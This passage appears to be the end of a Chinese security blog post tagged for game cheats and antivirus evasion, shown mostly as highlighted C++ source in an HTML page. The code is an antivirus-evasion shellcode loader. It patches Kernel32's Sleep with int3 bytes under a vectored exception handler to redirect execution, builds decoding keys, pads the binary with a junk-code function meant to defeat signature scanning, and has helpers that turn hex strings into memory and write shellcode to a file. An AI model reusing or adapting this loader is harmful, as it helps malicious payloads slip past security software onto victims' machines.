class="number">0x3</span>,<span class="number">0x4</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> Key3[<span class="number">4</span>] = &#123; <span class="number">0x4</span>,<span class="number">0x5</span>,<span class="number">0x5</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (arg &lt;= <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">0</span>, <span class="number">0x4</span>, Key1, <span class="number">3</span>);</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">1</span>, <span class="number">0x4</span>, Key2, <span class="number">3</span>);</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">2</span>, <span class="number">0x4</span>, Key3, <span class="number">3</span>);</span><br><span class="line">		<span class="comment">//隐藏顶层窗口</span></span><br><span class="line">		<span class="comment">//HWND hwnd = GetForegroundWindow();</span></span><br><span class="line">		<span class="comment">//ShowWindow(hwnd, SW_HIDE);</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (arg == <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">0</span>, <span class="number">0x3</span>, Key1, <span class="number">3</span>);</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">1</span>, <span class="number">0x3</span>, Key1, <span class="number">3</span>);</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">2</span>, <span class="number">0x3</span>, Key1, <span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (arg == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">0</span>, <span class="number">0x3</span>, Key2, <span class="number">3</span>);</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">1</span>, <span class="number">0x3</span>, Key2, <span class="number">3</span>);</span><br><span class="line">		<span class="built_in">memcpy_s</span>(DecodeKey + <span class="number">2</span>, <span class="number">0x3</span>, Key2, <span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置异常函数</span></span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="literal">true</span>, callback);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取Sleep函数地址</span></span><br><span class="line">	<span class="comment">//void* lpSleepAdr =  &amp;Sleep;</span></span><br><span class="line"></span><br><span class="line">	HMODULE hKer = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>);</span><br><span class="line">	lpSleepAdr = (DWORD64)<span class="built_in">GetProcAddress</span>(hKer, <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> Int3[] = &#123; <span class="number">0xcc</span>,<span class="number">0xcc</span>,<span class="number">0xcc</span>,<span class="number">0xcc</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//改一下属性 , 可以直接改属性，但是触发属性的地址有点多就先用int3</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)lpSleepAdr, <span class="number">0x4</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);</span><br><span class="line">	<span class="comment">//备份原本命令</span></span><br><span class="line">	<span class="built_in">memcpy_s</span>(Old_Code, <span class="built_in">sizeof</span>(Old_Code), (<span class="type">void</span>*)lpSleepAdr, <span class="number">4</span>);</span><br><span class="line">	<span class="comment">//设置属性</span></span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="type">void</span>*)lpSleepAdr, Int3, <span class="built_in">sizeof</span>(Int3));</span><br><span class="line">	<span class="comment">//恢复属性</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)lpSleepAdr, <span class="number">0x4</span>, OldProtect, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	std::chrono::seconds t = std::chrono::<span class="built_in">seconds</span>(<span class="number">10</span>);</span><br><span class="line">	std::this_thread::<span class="built_in">sleep_for</span>(t);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DIYFUNC</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DIYFUNC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">float</span> jdxezfwo1fd = <span class="number">3595785</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">17104435</span>)jdxezfwo1fd = <span class="number">7179609</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">6727346</span>)jdxezfwo1fd = <span class="number">5186313</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">2642530</span>)jdxezfwo1fd = <span class="number">6098365</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">100804505</span>)jdxezfwo1fd = <span class="number">18155918</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">13639432</span>)jdxezfwo1fd = <span class="number">1309472</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">20163483</span>)jdxezfwo1fd = <span class="number">72897350</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">4537353</span>)jdxezfwo1fd = <span class="number">17846170</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">3012330</span>)jdxezfwo1fd = <span class="number">17363813</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">7726324</span>)jdxezfwo1fd = <span class="number">17223047</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">21198746</span>)jdxezfwo1fd = <span class="number">8367300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">17805906</span>)jdxezfwo1fd = <span class="number">19763965</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">71442650</span>)jdxezfwo1fd = <span class="number">3389300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">72795400</span>)jdxezfwo1fd = <span class="number">20021901</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">1669214</span>)jdxezfwo1fd = <span class="number">3343457</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd = <span class="number">11587996</span>)jdxezfwo1fd = <span class="number">28890194</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">float</span> jdxezfwo1fd1 = <span class="number">3595785</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">17104435</span>)jdxezfwo1fd1 = <span class="number">7179609</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">6727346</span>)jdxezfwo1fd1 = <span class="number">5186313</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">2642530</span>)jdxezfwo1fd1 = <span class="number">6098365</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">100804505</span>)jdxezfwo1fd1 = <span class="number">18155918</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">13639432</span>)jdxezfwo1fd1 = <span class="number">1309472</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">20163483</span>)jdxezfwo1fd1 = <span class="number">72897350</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">4537353</span>)jdxezfwo1fd1 = <span class="number">17846170</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">3012330</span>)jdxezfwo1fd1 = <span class="number">17363813</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">7726324</span>)jdxezfwo1fd1 = <span class="number">17223047</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">21198746</span>)jdxezfwo1fd1 = <span class="number">8367300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">17805906</span>)jdxezfwo1fd1 = <span class="number">19763965</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">71442650</span>)jdxezfwo1fd1 = <span class="number">3389300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">72795400</span>)jdxezfwo1fd1 = <span class="number">20021901</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">1669214</span>)jdxezfwo1fd1 = <span class="number">3343457</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd1 = <span class="number">11587996</span>)jdxezfwo1fd1 = <span class="number">28890194</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">float</span> jdxezfwo1fd2 = <span class="number">3595785</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">17104435</span>)jdxezfwo1fd2 = <span class="number">7179609</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">6727346</span>)jdxezfwo1fd2 = <span class="number">5186313</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">2642530</span>)jdxezfwo1fd2 = <span class="number">6098365</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">100804505</span>)jdxezfwo1fd2 = <span class="number">18155918</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">13639432</span>)jdxezfwo1fd2 = <span class="number">1309472</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">20163483</span>)jdxezfwo1fd2 = <span class="number">72897350</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">4537353</span>)jdxezfwo1fd2 = <span class="number">17846170</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">3012330</span>)jdxezfwo1fd2 = <span class="number">17363813</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">7726324</span>)jdxezfwo1fd2 = <span class="number">17223047</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">21198746</span>)jdxezfwo1fd2 = <span class="number">8367300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">17805906</span>)jdxezfwo1fd2 = <span class="number">19763965</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">71442650</span>)jdxezfwo1fd2 = <span class="number">3389300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">72795400</span>)jdxezfwo1fd2 = <span class="number">20021901</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">1669214</span>)jdxezfwo1fd2 = <span class="number">3343457</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd2 = <span class="number">11587996</span>)jdxezfwo1fd2 = <span class="number">28890194</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">float</span> jdxezfwo1fd3 = <span class="number">3595785</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">17104435</span>)jdxezfwo1fd3 = <span class="number">7179609</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">6727346</span>)jdxezfwo1fd3 = <span class="number">5186313</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">2642530</span>)jdxezfwo1fd3 = <span class="number">6098365</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">100804505</span>)jdxezfwo1fd3 = <span class="number">18155918</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">13639432</span>)jdxezfwo1fd3 = <span class="number">1309472</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">20163483</span>)jdxezfwo1fd3 = <span class="number">72897350</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">4537353</span>)jdxezfwo1fd3 = <span class="number">17846170</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">3012330</span>)jdxezfwo1fd3 = <span class="number">17363813</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">7726324</span>)jdxezfwo1fd3 = <span class="number">17223047</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">21198746</span>)jdxezfwo1fd3 = <span class="number">8367300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">17805906</span>)jdxezfwo1fd3 = <span class="number">19763965</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">71442650</span>)jdxezfwo1fd3 = <span class="number">3389300</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">72795400</span>)jdxezfwo1fd3 = <span class="number">20021901</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">1669214</span>)jdxezfwo1fd3 = <span class="number">3343457</span>;</span><br><span class="line">	<span class="keyword">if</span> (jdxezfwo1fd3 = <span class="number">11587996</span>)jdxezfwo1fd3 = <span class="number">28890194</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">Buf16ToMem16</span><span class="params">(std::string sBuf, _Outptr_ DWORD &amp;BufSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string strBuf = sBuf;</span><br><span class="line">	std::string strtmp;</span><br><span class="line">	DWORD dwSt = <span class="number">0</span>, dwEd = <span class="number">0</span>, dwCount = <span class="number">0</span>, dwStrSz = <span class="number">0</span>;</span><br><span class="line">	BYTE* bTmp = <span class="keyword">new</span> BYTE&#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">void</span>* TmpVoid;</span><br><span class="line">	<span class="type">void</span>* RetVoid;</span><br><span class="line"></span><br><span class="line">	dwStrSz = strBuf.<span class="built_in">size</span>();</span><br><span class="line">	dwSt = strBuf.<span class="built_in">find</span>(<span class="string">&quot;\\&quot;</span>, dwSt ? dwSt + <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">	TmpVoid = <span class="keyword">new</span> <span class="type">char</span>[dwStrSz] &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dwEd = strBuf.<span class="built_in">find</span>(<span class="string">&quot;\\&quot;</span>, dwSt + <span class="number">1</span>);</span><br><span class="line">		strtmp = strBuf.<span class="built_in">substr</span>(dwSt + <span class="number">1</span>, (dwEd - dwSt - <span class="number">1</span>));</span><br><span class="line">		<span class="built_in">sscanf_s</span>(strtmp.<span class="built_in">c_str</span>(), <span class="string">&quot;x%x&quot;</span>, &amp;bTmp);</span><br><span class="line">		<span class="built_in">memcpy_s</span>((<span class="type">char</span>*)TmpVoid + dwCount, <span class="number">1</span>, &amp;bTmp, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwEd == std::string::npos)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		++dwCount;</span><br><span class="line">		dwSt = dwEd;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	RetVoid = <span class="keyword">new</span> <span class="type">char</span>[dwCount + <span class="number">1</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">memcpy_s</span>(RetVoid, dwCount + <span class="number">1</span>, TmpVoid, dwCount + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">delete</span> TmpVoid;</span><br><span class="line">	TmpVoid = <span class="literal">NULL</span>;</span><br><span class="line">	BufSize = dwCount + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> RetVoid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">hexdump</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string sRet;</span><br><span class="line">	<span class="type">char</span>* pcaddr = (<span class="type">char</span>*)addr;</span><br><span class="line">	<span class="type">char</span> temp[<span class="number">512</span>];</span><br><span class="line">	<span class="type">size_t</span> put_size = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> used_size = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> remain_size = <span class="built_in">sizeof</span>(temp);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> var = *(<span class="type">unsigned</span> <span class="type">char</span>*)(pcaddr + i);</span><br><span class="line">		put_size = <span class="built_in">snprintf</span>(temp, remain_size, <span class="string">&quot;0x%02X&quot;</span>, var);</span><br><span class="line">		sRet += temp;</span><br><span class="line">		<span class="keyword">if</span> (i == length - <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> sRet;</span><br><span class="line">		&#125;</span><br><span class="line">		sRet += <span class="string">&quot;,&quot;</span>;</span><br><span class="line">		<span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in">sizeof</span>(temp));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, sRet.<span class="built_in">c_str</span>());</span><br><span class="line">	<span class="keyword">return</span> sRet;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">TOOL_Buffer_to_File</span><span class="params">(<span class="type">char</span>* Buffer, DWORD dwSize, WCHAR *FilePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//---------------------------------------写入文件</span></span><br><span class="line">	HANDLE NFile = <span class="number">0</span>;</span><br><span class="line">	DWORD dwRetBuf = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		NFile = <span class="built_in">CreateFile</span>(FilePath, GENERIC_ALL, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FALSE);</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">GetLastError</span>() == ERROR_ALREADY_EXISTS &amp;&amp; <span class="built_in">DeleteFile</span>(FilePath));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_ACCESS_DENIED)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//MessageBox(NULL, L&quot;出现错误，请用管理员权限重试&quot;, L&quot;ERROR!&quot;, 0);</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//生成的是ShellCode</span></span><br><span class="line">	<span class="built_in">WriteFile</span>(NFile, Buffer, dwSize, &amp;dwRetBuf, FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(NFile);</span><br><span class="line">	<span class="keyword">return</span> dwRetBuf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%A4%96%E6%8C%82/" rel="tag"><i class="fa fa-tag"></i> 外挂</a>
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="fa fa-tag"></i> 免杀</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/-SQLInject/Oracle/" rel="prev" title="Oracle注入">
+                  <i class="fa fa-chevron-left"></i> Oracle注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/PWN/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94PWN%E9%83%A8%E5%88%86/" rel="next" title="攻防世界部分PWN题">
+                  攻防世界部分PWN题 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nu1r</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL251MXI=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.3/katex.min.css" integrity="sha256-NJNVfEC6jfEt62wQMafLNT2eI6BaWONXbpkSEVAs3+8=" crossorigin="anonymous">
+  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.3/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
+  <script src="/js/third-party/math/katex.js"></script>
+
+
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: '32px',
+  left: 'unset',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+</body>
+</html>
